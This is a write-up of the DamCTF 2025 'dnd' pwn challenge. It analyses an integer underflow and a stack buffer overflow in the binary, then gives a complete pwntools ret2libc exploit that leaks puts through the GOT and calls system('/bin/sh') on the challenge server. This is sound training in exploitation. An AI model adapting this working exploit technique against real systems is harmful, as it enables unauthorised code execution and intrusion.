---
title: "DamCTF 2025 - pwn/dnd writeup"
description: "Writeup post for DamCTF 2025"
publishDate: "12 May 2025"
updatedDate: "25 Aug 2025"
tags: ["CTFs", "writeup"]
---

# Challenge Info

## Description

Dungeons and Dragons is fun, but this is DamCTF! Come play our version.

> Author: captainGeech

## Attached Files

- dnd.zip  
  - dnd  
  - libc.so.6  
  - ld-linux-x86-64.so.2  

# Solution

## Step 1. Reverse Engineering

After decompiling the ELF binary `dnd`, we identified two key vulnerabilities:

> **1. Integer Underflow** (which I missed during the competition)

```cpp
bool __fastcall Game::DidWin(Game *this)
{
  return *(_BYTE *)this > 99u;
}
```

The `DidWin` function contains an integer underflow vulnerability.  
This occurs because a signed negative value is interpreted as an unsigned one.  
Due to two's complement representation, negative values become very large numbers.  
For example, `-1` is stored in binary as `11111111 11111111 11111111 11111111`.  
When interpreted as an unsigned integer, it becomes `0xFFFFFFFF`.

> **2. Buffer Overflow**

There is a buffer overflow in the `win` function.  
The `input` buffer is only 32 bytes in size, but `fgets` attempts to read up to 256 bytes.  
This allows us to overwrite adjacent memory, providing a strong attack vector.

```cpp
__int64 win(void)
{
  __int64 v0; // rax
  __int64 v1; // rbx
  __int64 v2; // rax
  char input[32]; // [rsp+0h] [rbp-60h] BYREF
  _BYTE v5[39]; // [rsp+20h] [rbp-40h] BYREF
  char v6; // [rsp+47h] [rbp-19h] BYREF
  char *v7; // [rsp+48h] [rbp-18h]

  v0 = std::operator<<<std::char_traits<char>>(
         &std::cout,
         "Congratulations! Minstrals will sing of your triumphs for millenia to come.");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::operator<<<std::char_traits<char>>(&std::cout, "What is your name, fierce warrior? ");
  fgets(input, 256, _bss_start);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "We will remember you forever, ");
  v7 = &v6;
  std::string::basic_string<std::allocator<char>>(v5, input, &v6);
  v2 = std::operator<<<char>(v1, v5);
  std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  std::string::~string(v5);
  return std::__new_allocator<char>::~__new_allocator(&v6);
}
```

## Step 2. Binary Analysis

It's time to dive deeper into the binary for more detailed information.

> **checksec**

```bash
pwndbg> checksec
File:     /home/grissia/Documents/DamCTF/dnd/dnd
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

This configuration works in our favor — both Stack Canary and PIE are disabled.  
That means we don’t have to worry about stack protections or address randomization.

---

What I’m thinking now is a `ret2libc` attack.  
Since the challenge provides a `libc` file, it's likely we are meant to use it.  
Also, because NX is enabled and the binary is dynamically linked, injecting shellcode (`ret2sc`) or using raw ROP chains isn’t an option.

So the first step is to patch the binary to link with the provided libc.

> **Patching the ELF**

```bash
cp dnd chal_patched
patchelf --replace-needed libc.so.6 ./libc.so.6 --set-interpreter ./ld-linux-x86-64.so.2 ./chal_patched
```

---

Next, we perform a basic overflow analysis.  
We’ll use `cyclic` from `pwndbg` to generate a pattern and find the exact buffer overflow offset.

> **Finding the buffer overflow offset**

```bash
pwndbg> cyclic 200
aaaaaa...aaaa
pwndbg> r

##### Welcome to the DamCTF and Dragons (DnD) simulator #####
Can you survive all 5 rounds?

>>> Round 1
Points: 0 | Health: 10 | Attack: 5
New enemy! You are now facing off against: Zoggoth the Ogre (6 health, 2 damage)
Do you want to [a]ttack or [r]un? a
Oof, that hurt ;(

>>> Round 2
Points: -6 | Health: 8 | Attack: 5
New enemy! You are now facing off against: Terragon the Dragon (9 health, 9 damage)
Do you want to [a]ttack or [r]un? a
Oof, that hurt ;(
Congratulations! Minstrels will sing of your triumphs for millennia to come.
What is your name, fierce warrior? aaaaa...aaaaa

0x402960 <win()+243>    ret            <0x616161616161616e>

pwndbg> cyclic -l 0x616161616161616e
Finding cyclic pattern of 8 bytes: b'naaaaaaa' (hex: 0x6e61616161616161)
Found at offset 104
```

Since we're planning to perform a `ret2libc` attack,  
our goal is to call `system("/bin/sh")`.  
We can use `pwntools` to easily locate the string and function addresses,  
but we’ll also need a `pop rdi; ret` gadget to set the first argument to `/bin/sh`.  
For that, `ROPgadget` is a useful tool.

> **Finding a gadget to set `/bin/sh` into `rdi`**

```bash
❯ ROPgadget --binary=chal_patched | grep "pop rdi"
...
0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
...
```

This gadget is the most suitable one for setting up our exploit.

## Step 3. Exploit

```python
from pwn import *

FILENAME = "./chal_patched"
context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"
exe = context.binary = ELF(FILENAME)
libc = ELF("./libc.so.6")
r = remote("dnd.chals.damctf.xyz", 30813)

def try_once(r):
    # This function attempts to obtain a "winning" session.
    # As mentioned earlier, I initially overlooked the integer underflow issue while fuzzing the binary.
    # From experimentation, choosing [attack] appears more likely to lead to a win.
    # So this function is essentially brute-forcing until we hit a win — it doesn't always succeed.

    max_rounds = 50
    current_round = 0

    try:
        while current_round < max_rounds:
            current_round += 1
            print(f"[*] Round {current_round}/{max_rounds}")

            output = r.recvuntil(b"? ", timeout=3)
            if not output:
                continue

            decoded = output.decode(errors='ignore').strip()
            log.info(f"Received: {decoded}")

            if "Congratulations!" in decoded or "fierce warrior" in decoded:
                log.success("Found a winning session!")
                return r

            if "Do you want to [a]ttack or [r]un?" in decoded:
                r.sendline(b'a')
                log.info("Sent 'a' to attack")

    except EOFError:
        r.close()
        return None

    r.close()
    return None


try_once(r)  # Start by finding a winning session

# gdb.attach(r, 'b *0x402960')
# pause()

# These are static addresses obtained from the binary.
# Most of them will be used for constructing the payload.
offset = 104
puts_plt = exe.plt['puts']
puts_got = exe.got['puts']
start_addr = exe.symbols['_start']
pop_rdi_pop_rbp_ret = 0x0000000000402640

info(f"puts plt: {hex(puts_plt)}")
info(f"puts got: {hex(puts_got)}")

# This stage leaks the real address of puts from the GOT.
# With that, we can calculate the libc base address.
# We also chain the _start address at the end to restart the program cleanly.
payload = b"a" * offset
payload += p64(pop_rdi_pop_rbp_ret)  # pop rdi; pop rbp; ret
payload += p64(puts_got)             # Address to leak
payload += p64(0xdeadbeef)           # Dummy value for rbp
payload += p64(puts_plt)             # Call puts
payload += p64(start_addr)           # Restart the program

r.sendline(payload)
r.recvline()

puts_real_addr = u64(r.recvline().strip().ljust(8, b'\x00'))
log.success(f"puts real addr: {hex(puts_real_addr)}")
libc_base = puts_real_addr - libc.symbols['puts']
log.success(f"libc base: {hex(libc_base)}")

try_once(r)  # Get another winning session to continue exploitation

system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b"/bin/sh"))
log.success(f"system addr: {hex(system_addr)}")
log.success(f"/bin/sh addr: {hex(binsh_addr)}")

# This is the core exploitation step.
# Set up RDI to point to "/bin/sh" and call system().
# This should spawn a shell.
payload = b"a" * offset
payload += p64(0x000000000040201a)   # ret (for stack alignment)
payload += p64(pop_rdi_pop_rbp_ret)  # pop rdi; pop rbp; ret
payload += p64(binsh_addr)           # "/bin/sh"
payload += p64(0xdeadbeef)           # Dummy rbp
payload += p64(0x000000000040201a)   # ret (optional: alignment)
payload += p64(system_addr)          # Call system

r.sendline(payload)
r.interactive()
```
